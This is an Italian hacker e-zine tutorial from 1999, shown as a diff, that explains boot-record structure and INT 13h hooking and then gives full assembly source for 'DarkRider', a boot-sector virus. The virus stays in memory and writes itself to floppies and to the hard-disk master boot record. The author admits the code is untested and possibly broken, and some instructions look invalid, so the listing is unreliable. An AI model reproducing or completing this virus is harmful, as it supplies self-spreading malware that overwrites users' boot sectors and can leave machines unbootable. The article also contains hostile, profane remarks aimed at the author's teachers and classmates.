@@ -1,0 +1,570 @@
+Autore: cod
+Origine: Sud Italia
+LocalitÖ: Prov. Vibo Valentia
+Data: Sabato, 19 giugno 1999
+
+Obiettivo: Scrittura di un virus da BOOT
+
+Strumenti usati: Compilatore TASM 5.0
+                 Reperibile presso www.crackstore.com oppure su
+                 e-ViP CD Tools n. #1
+                 Qualsiasi altro compilatore che supporti la modalitÖ MASM
+
+Documentazione: Nessuna
+
+E-mail: cod@gurlmail.com
+ICQ: lasciare il vs numero in mail.... vi chiamerï io
+IRC: Durante la settimana su irc.tin.it verso le 20.30, domenica esclusa
+     Canale #virus.it
+
+Livello di difficoltÖ: MEDIO
+
+Il BOOT SECTOR ä quella parte di un disco che ha il compito di caricare il
+sistema operativo.
+
+Fisicamente il BOOT RECORD ( da in poi con BR } si trova alla traccia
+0, faccia 0, settore 1 di qualsiasi floppy disk. Sui dischi fissi invece a
+queste coordinate abbiamo un settore chiamato MASTER BOOT RECORD { da ora
+in poi MBR } dove risiede un piccolo programma dalla dimensione di circa 200
+byte pió una tabella contenente le varie partizioni del disco. Fisicamente
+ogni settore di un disco (sia esso hard disk o floppy disk) ha una
+dimensione di 512 byte. La principale differenza che distingue un MBR da un
+BR consiste nel fatto che il BR si occupa di caricare il S.O. mentre il
+compito dell'MBR ä quello di determinare la partizione attiva da cui
+caricare il BR che a sua volta si occupa di caricare l'O.S.
+
+
+La struttura standard di un BR ä la seguente:
+OFFSET CONTENUTO               DESCRIZIONE
+000h   NEAR JUMP - SHORT JUMP  Contiene un salto all'istruzione 3Eh
+003h   OEM                     Nome del sistema operativo
+; Blocco Parametri Bios
+00Bh   sectSIZE                Dimensione settori
+00Dh   clustSIZE               Dimensione cluster
+00Eh   resSECT                 Numero settori riservati dopo il BR
+010h   fatCNT                  Numero di FAT
+011h   rootSIZE                Numero di voci memorizzabili nella ROOT
+013h   totalSECT               Numero totali di settori
+015h   MEDIA                   Descrittore DOS
+016h   fatSIZE                 Numero settori x FAT
+018h   trackSECT               Numero settori x traccia
+01Ah   headCNT                 Numero di faccie del supporto
+01Ch   hidenSECT               Settori nascosti
+020h   hugeSECT                Se totalSECT=0 qui viene memorizzato il
+                               numero di settori del supporto
+; Fine Blocco Parametri Bios
+024h   driveNUM                Usato dal DOS ( 80h se disco d'avvio )
+025h   reserv                  Non usato
+026h   bootSIGN                Settato a 29h - Extended boot signature (?)
+027h   volID                   Numero seriale Volume
+02Bh   volLABEL                Nome assegnato al disco durante la procedura
+                               di formattazione.
+036h   fsTYPE                  Identifica il file system adottato.
+03Eh   Boot loader
+1FEh   signature               WORD x indicare che ä un settore valido.
+
+
+La struttura standard di un MBR ä la seguente:
+OFFSET CONTENUTO               DESCRIZIONE
+000h   Inizio MBR              Codice del loader, deve contenere anche
+                               i vari messaggi di diagnostica.
+1BEh   Partizione 1            Inizia a: FACCIA - SETTORE - CILINDRO
+                                        ( 1byte   1byte     2byte)
+1C2h   Partizione 1            Finisce a: FACCIA - SETTORE - CILINDRO
+1C6h   Partizione 1            Numero settore assoluto dove incomincia la
+                               partizione per quei OS che usano il modo LBA
+1CAh   Partizione 1            Numero assoluto dei settori contenuti
+
+; Tale struttura si replica x altre 3 volte, assumendo i dati della
+; partizione 2, 3, 4
+1FEh   Marcatura BOOT Record   Contiene i byte 55h, AAh
+                               Se questi due byte non sono settati con
+                               tali valori il BIOS non carica il disco.
+
+Bisogna perï sapere che la prima partizione non ha inizio che nella traccia
+0 faccia 1 quindi si puï registrare qualsiasi cosa nei settori rimanenti
+nella faccia 0, che in un moderno disco fisso possono arrivare anche ad
+essere circa 32kbyte di spazio. Ecco dove risiedono programmi quali LILO,
+System Commander e altre applicazioni che caricano OS diversi su un disco
+fisso.
+
+Ma lo scopo del nostro articolo non ä affatto questo, anche se vi dirï
+che sapendo queste poche notizie giÖ pubblicate in alto e un pï di fantasia
+potreste creare un bel programmino di FDISK residente nell'MBR... forse in
+un articolo futuro, quando si apriranno nuovi orizzonti, dato che non esiste
+limite alla fantasia e tantomeno all'ingegno, e come dice il proverbio
+"il bisogno aguzza l'ingegno" (o gió per lç non mi ricordo questo proverbio)
+
+Ora passiamo sul fronte del BIOS:
+Una volta che viene terminata la procedura di BOOT STRAP (tutti quei test)
+viene lanciato l'INT19h questo legge dalla memoria CMOS (per questa memoria
+ci vuole un'altro articolo, magari in VANA IMAGO #4 se Techno Knight decide
+di pubblicarla ancora... prima dice che non ne pubblica pió, ieri sera
+invece ha chiesto di scrivere qualche articolo... vallo a capire) la
+procedura di BOOT (solo sui BIOS dopo il 1993 fa questa operazioni, nei
+vecchi BIOS il BOOT era standard) che solitamente ä Floppy A, Disco 1.
+Stabilito il supporto da cui eseguire il BOOT viene caricato il primo setto_
+re assoluto che nei dischi fissi ä l'MBR, mentre nei floppy ä il BR (spero
+che non l'abbiate dimenticato).                                 
+Questo settore viene caricato all'offset assoluto di memoria 07C00h perï
+bisogna notare che il registro CS ä settato a 0, quindi IP a 7C00h quando
+sarÖ trasferito il controllo al BR. La prima delle pió importanti operazioni
+da fare se si vuol lavorare in modo decente ä quello di passare al segmento
+07C0 con offset che punta all'istruzione successiva (pió avanti capirete).
+0000:7C00 e 07C0:0000 non sono altro che lo stesso byte, ma bisogna notare
+che nel primo caso si deve tener conto del fatto che ad ogni indirizzo
+bisogna addizionare la base fissa 7C00 mentre nel secondo no, pertanto
+suggerisco il 2¯ approcio, lo fanno tutti i virus e anche i normali BOOT
+LOADER Ora lo scopo principale sarebbe quello di caricare il sistema operati
+vo ma nessuno ci impedisce di piazzarci il nostro bel virus. La prima cosa
+che il virus deve fare ä quello di assicurarsi un pï di memoria convenziona_
+le pertanto l'unico metodo momentaneamente a disposizione ä quello di chiama
+re l'INT12 che ci restituisce nel registro AX la quantitÖ in Kbyte di
+memoria convenzionale esistente sul sistema (o disponibile se ci sta giÖ il
+virus). Normalmente otterremmo come risposta 639 (1kb se lo frega il bios!)
+quindi noi decrementiamo questo valore a 638 o 637 (siate spilorci.. io lo
+sono in questi termini) a secondo se il nostro virus ä per lo pió complesso
+o semplice... tutto dipende da voi e dalle vostre idee maliziose.
+Abbiamo in AX 639, facciamo un bel DEC AX e otterremo 638, si ma soltanto
+nel registro accumulatore, come facciamo a comunicarlo all'intero sistema
+che da ora in poi c'ä TOTkbyte a disposizione?
+All'offset 0000:0400h o al byte assoluto 0400h ha inizio la BIOS DATA AREA,
+una locazione di memoria che nemmeno l'OS tocca dato che il cambiamento di
+questa zona non porta altro che scompiglio. La cosa che per il momento ci
+interessa sapere ä che a ridosso di questa tabella, precisamente aggiungendo
+a 400h il valore 13h arriveremo ad una WORD che guarda un pï cosa contiene?
+Un bel 630 (o qualsiasi altro valore che abbiate ottenuto) e noi non volendo
+far del male a nessuno (io non sono di questo parere, e voi ?) memorizziamo
+il nostro bel valore contenuto nell'accumulatore (o registro AX). Ora per
+prima cosa dobbiamo trasferire il nostro codice in questa locazione di memo_
+ria, pertanto bisogna ricavare il segmento dove trasferire il virus. Per
+ricavare questo segmento potremmo moltiplicare il valore di AX * 1024 e
+dividere il tutto per 16 (stiamo operando in modalitÖ reale, per chi non
+lo avesse capito...) ma perchä fare quanto segue:
+
+MOV CX, 1024
+MUL CX
+MOV CX, 16
+DIV CX
+
+dato che noi dobbiamo moltiplicare semplicemente per 64 (1024 / 16 = ???)
+e la matematica ci insegna che il 64 ä un numero naturale divisibile per 2.
+Avete qualche dubbio ? E ricorrendo alla matematica binaria il 64 ä un
+multiplo di 2 ed svolgendo la seguente potenza 2^6 abbiamo di nuovo 64.
+Ora potremmo ricavare il segmento che ci interessa semplicemente con una
+sola istruzione:
+SHL AX, 6
+
+Cosa significa ? Be SHIFT LOGICAL LEFT ovvero far scivolare i BIT a sinistra
+per 6 volte, e dovendo moltiplicare per 2 per 6 volte, questo fa a caso
+nostro.
+
+Trasferiamo il ns virus nel nuovo segmento:
+
+PUSH AX
+XOR AX, AX
+MOV DI, AX
+MOV SI, AX
+PUSH CS
+POP DS
+POP ES
+MOV CX, [dimensione del virus in byte, in word, in dword]
+REP MOVS? (al posto di ? ci piazziamo B per byte, W per word, D per dword)
+          ricordando il simbolo da piazzare ä strettamente collegato a
+          come avete indicato la dimensione in CX, altrimenti rischiate
+          di copiare pochi o assai byte.
+
+Facciamo un bel FAR JUMP alla prossima istruzione ed eccoci operare dal
+segmento di nostra legittima proprietÖ.
+
+Prossimo obiettivo: Assicurarci l'esecuzione del virus.
+
+E come facciamo ? Be, semplicemente ci prendiamo il puntatore FAR dell'INT13
+e lo sostituiamo con un puntatore FAR al nostro INT13!
+La tabella di interrupt ä situato all'inizio della memoria ed ä costituita
+da un'insieme di 256 puntatori FAR. I puntatori FAR non sono altro che
+indirizzi di memoria della lunghezza di 4byte, i quali contengono l'indiriz_
+zo assoluto di un byte, ma in modalitÖ reale non contengono altro che il
+seg:off del byte. Pertanto per leggere/modificare questo puntatore non dobbi
+amo far altro che leggere i 4 byte compresi tra 004Ch e 004Fh. Il seguento
+procedimento fa a caso nostro:
+
+XOR AX, AX
+PUSH AX
+POP DS
+MOV AX, WORD PTR DS:[004Ch]   ; Ricava l'offset
+; Lo copiamo dove ci pare
+MOV AX, WORD PTR DS:[004Eh]   ; Ricava il segment
+; Lo copiamo dove ci pare
+
+Per sovrascrivere il puntatore non dobbiamo far altro che
+MOV AX, OFFSET myint13
+MOV WORD PTR DS:[004Ch], AX
+MOV WORD PTR DS:[004Eh], CS   ; Be stiamo operando nello stesso segmento
+                              ; dove sta il virus e il nuovo int13!
+
+Ora bisogna codificare l'int13h. Il vostro int13h, con le vostre idee,
+con tutto quello che vi pare e piace.
+
+Io vi leggo quanto ho scritto nella mia agenda:
+>12 Gennaio 1999 Ore 4.50am
+>Inizio a scrivere un nuovo virus da BOOT
+>14 Gennaio 1999 Ore 6:00am
+>Il nuovo INT13 intercetta le chiamate e controlla se le operazioni sono
+>effettuate sul primo settore del disco.
+>
+>Beh il mio INT13 aveva qualche cosa che non funzionava, infatti lo
+>continuai fino alla mattina 18 evitando di toccarlo giorno 17, in quanto
+>c'era collegata una sorpresina al giorno 17 di ogni mese.
+>18 Gennaio 1999 Ore 7:00am
+>Qualcosa non va bene!!!
+>18 Gennaio 1999 Ore 10:00am
+>Sto scrivendo ancora il mio virus (ci sto lavorando dalle 5 del mattino,
+>non sono davanti a un computer, bensç davanti al prof. a scuola. Mentre
+>spiega io sto scrivendo sul quaderno un INT13 che in teoria ä tutto
+>esatto.
+
+>Tornato a casa lo codifico, e il mio virus funziona!!!!
+>Errore trovato in:
+>Ogni qualvolta chiamavo il vecchio INT13 usavo la direttiva
+>CALL FAR PTR CS:[Oldint13]
+>ma l'offset nello stack era alterato.
+>Piccolo errore: sto giocando con un INTERRUPT SOFTWARE, e termina con IRET
+>Il che vuol dire che ä stato chiamato da un INT
+>e l'INT oltre a salvare nello stack CS ed IP salva prima anche i FLAG il
+>che significa che debbo salvarli prima di procedere con la CALL
+>Metto davanti a tutte le FAR CALL un bel PUSHF ed ecco il gioco fatto.
+
+Vi ho detto tutto questo soltanto per darvi un consiglio!
+Se state lavorando a qualcosa ä non riuscite a venirne a capo, lasciate
+stare per qualche pï di tempo, diciamo al massimo un giorno, e vedrete
+che mentre siete intenti a fare chissÖ cos'altro nel vostro piccolo
+cervello si illuminerÖ una lampadina da 1000W che conterrÖ la soluzione
+al vostro problema. Nel caso questa lampadina non si illuminasse, avete
+un'altra soluzione piuttosto brutale perï... spaccarvi la testa al muro
+e chiedere aiuto a qualcun'altro.
+
+Ora, dopo aver trattato l'argomento dovremmo passare alla pratica....
+Abbiamo 2 possibilitÖ:
+1) Commentare un virus giÖ esistente
+2) Scriverne uno nuovo.
+
+Immagino che tutti abbiate scelto il punto 2.
+
+Ho a disposizione un virus da allegare a quest'articolo ma purtroppo non
+ä commentato, non ä stato testato (funzionare funziona, necessita di qualche
+ritocco al codice di qua e di la per la sezione pió bella, la routine
+play_load....), non passa le protezioni dei bios, e vorrebbe ritoccato in
+qualche punto.
+La logica vorrebbe che inserissi questo virus, lo commentassi e apporterei
+le relative modifiche di cui ho parlato!
+Ma purtroppo non voglio, quel virus tocca un periodo della mia vita che
+desidero dimenticare per svariati problemi, quindi avrete l'onore
+ed il piacere (se piacere sempre sarÖ) di testare il virus che mi accingo
+a scrivere nelle ore successive, con qualche modifica che toccherÖ a voi
+capire!
+
+; DarkRider BOOT Sector
+; E' un'idea fissa! Il cavaliere nero! E' il mio migliore amico, che nella
+; vita reale si chiama Pasquale, ä stato lui ha dirmi questo nome che
+; abbiamo usato per fare una partitina ad Unreal.
+; Il mio amico ha preso una cotta, diciamo piuttosto bollente.
+;
+
+.MODEL TINY                            ; Direttiva che sta ad indicare
+                                       ; un progetto piuttosto piccolo.
+                                       ; 64Kbyte al massimo per codice
+                                       ; dati, stack tutto compreso.
+
+
+.386                                   ; Sarei tentato a scrivere .586P
+                                       ; Oggi tutti hanno un PII
+                                       ; un PIII, un AMDK6 3DNow
+                                       ; un CELERON, e io invece
+                                       ; nonostante tutto quello che so
+                                       ; mi debbo accontentare di un 386.
+
+LF   EQU 0Ah                           ; Quando saranno incontrate le
+CR   EQU 0Dh                           ; parole LF, CR, CRLF il compilatore
+CRLF EQU CR, LF                        ; le sostituirÖ coi valori a destra.
+
+.CODE                                  ; Incomincia il codice !
+
+ORG 0000h                              ; Assegnare come indirizzo base 0
+
+start_virus:
+ JMP next_code
+;db 90h                                ; Quel fetente del compilatore
+                                       ; genera un E9 o un EB per il salto?
+                                       ; Bo?? Vedete un po fate voi!
+                                       ; Se abbiamo un terzo byte che sarÖ
+                                       ; della stringa OEM dobbiamo mettere
+                                       ; il NOP altrimenti no.
+oem:
+db 'VIN3eViP'                          ; Bel Sistema operativo!
+                                       ; Vana Imago n.3
+                                       ; Articolo redatto da e-ViP
+                                       ; Ovvero il gruppo a cui appartengo!
+sectSIZE: db ?
+clustSIZE: db ?
+resSECT: db ?
+fatCNT: db ?
+rootSIZE: dw ?
+totalSECT: dw ?
+media: db ?
+fatSIZE: dw ?
+trackSECT: dw ?
+headCNT: dw ?
+hidenSECT: dd ?
+hugeSECT: dd ?
+driveNUM: db ?
+reserv: db ?
+bootSIGN: db ?
+volID: dd ?
+voLABEL: db '01234567890'
+filesTYPE: db 01h                      ; Ora settiamo 01 significa FAT12
+                                       ; dato che non penso che siate
+                                       ; scemi da caricarlo direttamente
+                                       ; su HD
+; Premetto che la struttura che vi ho presentato sopra poteva anche essere
+; un ammasso di byte settati a 0000, ma il sottoscritto essendo malvagio,
+; non volendo perdere il dischetto infetto (ebbene si! sono spilorcio
+; sulla memoria ram e anche su quella del dischetto) lascio questa
+; sezione di codici per permettere ad un OS pulito di leggere il floppy.
+; Ovviamente va modificata in pió punti, poi ho inserito le etichette
+; nel caso vi venisse qualche bella idea, ma lasciamo stare che ä meglio.
+
+next_code:
+; Cosa deve fare per prima cosa ? a si trasferirsi in un'altro seg di
+; memoria
+db 0EAh                                ; Opcode per indicare un FAR JUMP
+dw OFFSET next_ip                      ; Offset del FAR JUMP
+dw 07C0h                               ; Segmento fisso!
+
+next_ip:
+XOR AX, AX                             ; Azzeriamo AX, dato che tutti i bit
+                                       ; sono uguali il risultato sarÖ 0!
+PUSH AX                                ; Lo salviamo nello stack
+POP DS                                 ; Lo ripristiniamo dallo stack
+DEC WORD PTR DS:[0413h]                ; A si! la memoria!!!
+MOV AX, WORD PTR DS:[0413h]            ; Ora ci calcoliamo dove andarcene
+
+SHL AX, 6                              ; Calcolo il nuovo segmento!
+PUSH AX                                ; Lo registro in ES
+POP ES                                 ;
+MOV WORD PTR CS:[segnip2], AX          ; Be salviamola!
+PUSH CS                                ; Registro in DS l'indirizzo dove
+                                       ; sono!
+POP DS                                 ;
+XOR SI, SI                             ; Azzero i puntatori SI e DI
+XOR DI, DI                             ; DS:SI src ES:DI dest
+MOV CX, 128                            ; 128 DWORD ovvero 128 * 4 = 512
+REP                                    ; Ripeti MOVSD finchä CX non e' 0
+ MOVSD
+
+db 0EAh                                ; Ora saltiamo nel nostro nuovo
+dw offset next_ip2                     ; segmento di memoria come
+segnip2: dw ?                          ; se niente fosse accaduto!
+
+next_ip2:                              ; Continuo l'esecuzione normale!
+; La prima cosa che dobbiamo fare ä quella di considerare se giÖ il ns viru
+; s ä presente in memoria. Sarebbe da stupidi caricare lo stesso virus pió
+; volte in memoria!
+MOV AH, 'D'                            ; Settiamo AH e AL con le iniziali
+MOV AL, 'R'                            ; di DARK RIDER
+INT 13h                                ; Chiamiamo l'INT 13
+CMP AH, 'Y'                            ; AH = Y ? SI allora lasciamo stare
+JZ continue_loading
+; Be non ä caricato ?? No ? Allora installiamolo
+; In ogni caso giÖ la memoria se l'ä fregata, che sono 2k di memoria!
+PUSH 0000h                             ; Ora stiamo memorizzando
+POP DS                                 ; nel nostro programma
+MOV AX, WORD PTR DS:[004Ch]            ; l'indirizzo dell'INT13
+MOV WORD PTR CS:[oldint13], AX         ;
+MOV AX, WORD PTR DS:[004Eh]            ;
+MOV WORD PTR CS:[oldint13]+2, AX       ; E ci mettiamo il nostro!
+LEA AX, darkrider13                    ; Potremmo usare MOV AX, OFFSET ...
+                                       ; ma usiamo LOAD EFFECTIVE ADRESS
+MOV WORD PTR DS:[004Ch], AX            ; OFFSET
+MOV WORD PTR DS:[004Eh], CS            ; SEGMENT
+
+continue_loading:                      ; Sarebbe stupido caricare ora
+XOR AX, AX
+PUSH AX
+POP ES
+MOV BX, 7C00h
+MOV AX, 0201h                          ; il codice del floppy disk...
+MOV DL, 80h                            ; quindi ci cucchiamo il primo
+MOV CX, 0001h                          ; hd, che poi ci darÖ anche il 2¯
+INT 13h
+
+DB 0EAh                                ; Ritorniamo il controllo al prog
+DW 7C00h, 0000h                        ; vero....
+
+; Basta qui abbiamo finito!!!!
+; Ora ci tocca darkrider13
+
+oldint13:
+off13: dw ?
+seg13: dw ?
+
+; Progettate a tavolino il vs INT13 perchä io sono sicuro
+; di aver commesso qualche errore... chi vivrÖ lo saprÖ
+; Analizzate il flusso ? BOOO IO CI HO PARECCHI DUBBI
+; sul fatto che ä esatto, sapete non ho preso i vecchi appunti
+; e non ho molto tempo.
+; Cmq non so nemmeno se questo coso genera errori! auguri!
+darkrider13:                           ; Quasi quasi dimenticavo l'int13!
+PUSHF
+CMP AH, 'D'                            ; AX contiene 'DR'???
+JZ check_two                           ; Se si rispondigli con Y
+JNZ other                              ; Altrimenti controlliamo ancora....
+check_two:
+CMP AH, 'R'
+JNZ other
+MOV AH, 'Y'
+POPF
+JMP enddr13
+
+other:
+CMP DH, 00                             ; Si tratta della prima faccia ?
+JNZ continue_after                     ; A mi insospettivo
+CMP CX, 0001                           ; ? Ancora qui ? ma allora lo fai
+                                       ; apposta
+JNZ continue_after                     ; Mi fai venire un'infarto! Kakkio
+                                       ; E poi dicono che non debba infet
+                                       ; tare! E tu mi dai la possibilitÖ
+PUSHA                                  ; Salviamo tutto! non si sa mai
+MOV AX, 201h
+PUSH CS
+POP ES
+MOV BX, 0200h
+PUSHF
+CALL FAR CS:[oldint13]
+MOV EAX, DWORD PTR CS:[myname]
+CMP EAX, DWORD PTR CS:[myname]+200h    ; E' uguale ? Allora mi pare che ci
+                                       ; sei giÖ passato!
+JZ passato
+CMP DL, 80h
+JB write_virus
+MOV AX, 301h                           ; Sto salvando il vecchio MBR
+MOV BX, 0200h
+MOV CX, 0002h
+PUSHF
+CALL PTR FAR CS:[oldint13]
+MOV AX, 301h
+MOV BX, 0000h
+MOV CX, 0001h
+PUSHF
+CALL FAR PTR CS:[oldint13]             ; Fatto fuori l'hd!
+write_virus:
+
+passato:
+POPA
+JZ iswrite
+CMP DL, 80h
+JB continua_2                          ; Si ma si tratta di un HD?
+MOV CL, 02h                            ; Diamo i numeri ??? Fallo sul
+                                       ; secondo settore!! io non voglio
+JMP hd_ok                              ; giocare col primo!
+continua_2:
+CMP AH, 03h                            ; Ma a voglia di giocare ?
+JE write_bad                           ; Vuole scrivere... convinto!
+
+hd_ok:                                 ; Ora sto incominciando a capire
+POPF                                   ; pure io! L'hd e' sistemato!
+JMP normproc                           ; Ora rompe i coglioni al secondo
+                                       ; settore piuttosto che a me!
+write_bad:
+PUSHA                                  ; Qui il gioco si complica!
+MOV DS, ES
+MOV SI, 0003h
+MOV ES, CS
+MOV DI, 0003h
+MOV CX, 59                             ; Raga... controllate mi pare che
+                                       ; non erano 59 byte
+REP MOVSB                              ; Vada cosç
+MOV AX, 301h
+MOV BX, 0000h
+MOV CX, 0001h
+PUSHF
+CALL FAR PTR CS:[oldint13]
+POPA                                   ; Cristo!
+POPF
+JMP enddr13
+
+continue_after:
+POPF
+normproc:                              ; Continua come se niente fosse acca
+PUSHF                                  ; duto... normale no?
+CALL FAR PTR CS:[oldint13]             ; Turn of the page (Metallica)
+enddr13:                               ; Abbiamo giÖ finito ? Ma siamo sicu
+IRET                                   ; ri? Non e' che ti sei dimenticato
+                                       ; qualcosa ? Boooh :)
+
+myname:
+db 'VI3e-ViP.DarkRider'                ; Il nome del virus! Bello
+db '17Nov1998'                         ; Quella data che significa??
+db '31Gen1999'                         ; Qualche persona sa qualcosa ?
+db '...nevica'                         ; Beh chi lo sa si faccia avanti!
+                                       ; Ebbene si! il 31 gennaio nevicava
+                                       ; a Vibo... forse io ero lÏ ? forse
+                                       ; qualcuno sa dirmi qualcosa ?
+                                       ; Se si abbiate il coraggio di farvi
+                                       ; avanti che vi voglio dire una cosa!
+                                       ; DarkRider o DarkRyder ? Ci ho sto
+                                       ; dubbio!
+
+end_virus:
+DB (510 - OFFSET end_virus) DUP 00h    ; Un settore ha una lunghezza di 512
+                                       ; byte, pertanto facciamogliela avere
+                                       ; Questa direttiva calcola la lunghez
+                                       ; za del virus, la decrementa da 510
+                                       ; e quello che resta lo scrive come
+                                       ; byte nulli, perï poi ci aggiungiamo
+                                       ; il marchio sennï non parte da MBR!
+
+mark_code: DB 055h, 0AAh
+
+END start_virus                        ; STOP!!! BASTA DOVE VUOI ANDARE PIU'
+
+Bene qui abbiamo finito, sono le 16.30 del pomeriggio, mi sono messo
+alle 11.00... (se avessi passato cosç tanto tempo)
+Ho impiegato quasi 3 ore per scrivere questo articolo e quel specie
+di virus che non so nemmeno se funziona. Cmq ci sta l'originale di cui
+vi posso spedire in mail il codice sorgente. Decidete voi!
+
+Ringrazio:
+anto1 per avermi passato il RedHat 6 (fossi scemo a usare Windows, i virus
+sono rivolti per quella piattaforma.)
+Techno Knight perchä non ha niente di meglio da fare...
+^wAr^DoG^ per avermi portato in questa brutta cosa...
+LanDLorD per le sue idee pazze (ma poi l'hai chiamata a quella?)
+Pasquale, per tutti i giorni che sono trascorsi passeggiando... ormai la
+pacchia ä finita.
+Quelli che mi sono dimenticato da cui escludo parenti e conoscenti vicini.
+
+Ora siete arrivati alla fine ä giusto che mi presenti....
+La scuola ä finita, non so se continuare nei giorni a venire....
+Tutto sta da come si mette questa vita...
+Spero di ricevere commenti, critiche (sul virus non rompete le palle!! dato
+che l'ho scritto a caso e non so nemmeno se ä giusto, ho presupposto che
+dovrebbe funzionare... il mio cervello non ä un compilatore/debugger/process
+ore, quindi!).
+Se vi interessa qualche altro argomento sono a Vs disposizione...
+L'estate ä alle porte, gli esami pió prossimi che mai!
+INSOMMA VOGLIO DIRE
+
+
+PER QUEL CHE MI RIGUARDA LA SCUOLA E' FINITA PER SEMPRE!!!!!!!!!!!!!!!!!!!!
+TECHNO KNIGHT GIURO CHE SE TI VEDO TI TIRO IL COLLO! CI HA DATO UNA LIMITAZ
+IONE DI 76 CARATTERI PER RIGA! CHE KAZZO DOVER TENER CONTO ANCHE DI STE COSE
+ABBIAMO UNA MENTE... USIAMOLA
+
+Saluto:
+Tutti i miei compagni di classe che spero di non rivedere mai pió
+Tutti i miei professori mandandoli a quel paese
+Coloro che mi conosco e che odio!
+                                                                
+                                                                         cod
+
